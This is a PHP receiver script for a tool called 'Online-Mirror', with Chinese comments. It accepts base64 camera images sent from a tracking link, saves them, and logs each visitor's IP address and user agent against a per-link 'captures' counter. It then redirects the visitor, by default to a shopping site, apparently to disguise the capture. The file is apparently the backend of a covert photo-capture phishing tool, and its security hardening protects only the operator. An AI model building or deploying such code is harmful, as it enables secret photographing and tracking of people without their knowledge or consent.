<?php
/**
 * Online-Mirror 升级版 - 保存照片（接收端）
 * 已加固安全防护
 */
require_once __DIR__ . '/config.php';

$base64_img = trim($_POST['img'] ?? '');
$id = trim($_POST['id'] ?? '');
$url = trim($_POST['url'] ?? '');

if (empty($id) || empty($base64_img)) {
    if (!empty($url)) header("Location: " . $url);
    else header("Location: https://mobile.yangkeduo.com/");
    exit;
}

// ⚠️ 安全防护：限制 base64 图片大小（最大 5MB）
if (strlen($base64_img) > 5 * 1024 * 1024) {
    if (!empty($url)) header("Location: " . $url);
    else header("Location: https://mobile.yangkeduo.com/");
    exit;
}

// ⚠️ 安全防护：防止路径遍历，只允许字母数字下划线
$id = preg_replace('/[^a-zA-Z0-9_\-]/', '', $id);
if (empty($id)) {
    if (!empty($url)) header("Location: " . $url);
    else header("Location: https://mobile.yangkeduo.com/");
    exit;
}

// 确保图片目录存在
if (!file_exists(IMG_DIR)) {
    mkdir(IMG_DIR, 0755, true);
}

// ⚠️ 安全防护：在 img 目录写入 index.html 和 .htaccess 阻止目录遍历和脚本执行
if (!file_exists(IMG_DIR . 'index.html')) {
    file_put_contents(IMG_DIR . 'index.html', '<!DOCTYPE html><html><head><title></title></head><body></body></html>');
}
if (!file_exists(IMG_DIR . '.htaccess')) {
    file_put_contents(IMG_DIR . '.htaccess', "Options -Indexes\n<FilesMatch \"\.(php|php5|phtml|inc|cgi|pl|sh|py)$\">\nOrder Deny,Allow\nDeny from all\n</FilesMatch>");
}

// ⚠️ 安全防护：验证图片格式并限制
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
    $type = strtolower($result[2]);
    
    // 只允许安全的图片类型
    $allowed_types = ['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp'];
    if (!in_array($type, $allowed_types)) {
        if (!empty($url)) header("Location: " . $url);
        else header("Location: https://mobile.yangkeduo.com/");
        exit;
    }
    
    // 统一扩展名（jpeg → jpg）
    $ext_map = ['jpeg' => 'jpg'];
    $ext = $ext_map[$type] ?? $type;
    
    // ⚠️ 安全防护：生成随机文件名，防止文件名猜测和路径遍历
    $filename = $id . '_' . date('Ymd_His') . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8) . '.' . $ext;
    $filepath = IMG_DIR . $filename;
    
    // 解码图片数据
    $image_data = base64_decode(str_replace($result[1], '', $base64_img));
    
    // ⚠️ 安全防护：再次验证解码后的数据是有效图片
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_buffer($finfo, $image_data);
    finfo_close($finfo);
    
    $allowed_mime = ['image/png', 'image/jpeg', 'image/gif', 'image/bmp', 'image/webp'];
    if (!in_array($mime_type, $allowed_mime)) {
        if (!empty($url)) header("Location: " . $url);
        else header("Location: https://mobile.yangkeduo.com/");
        exit;
    }
    
    // 保存文件
    $file_size = file_put_contents($filepath, $image_data);
    
    // 入库
    try {
        $db = getDB();
        
        $stmt = $db->prepare("UPDATE links SET captures = captures + 1 WHERE link_id = ?");
        $stmt->execute([$id]);
        
        $stmt = $db->prepare("INSERT INTO photos (link_id, file_path, ip_address, user_agent, file_size) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([$id, $filename, getClientIP(), $_SERVER['HTTP_USER_AGENT'] ?? '', $file_size]);
        
        addLog($id, 'capture');
        
    } catch (Exception $e) {
        // 入库失败不影响跳转
    }
}

// 跳转
$target = !empty($url) ? $url : 'https://mobile.yangkeduo.com/';
header("Location: " . $target);
exit;
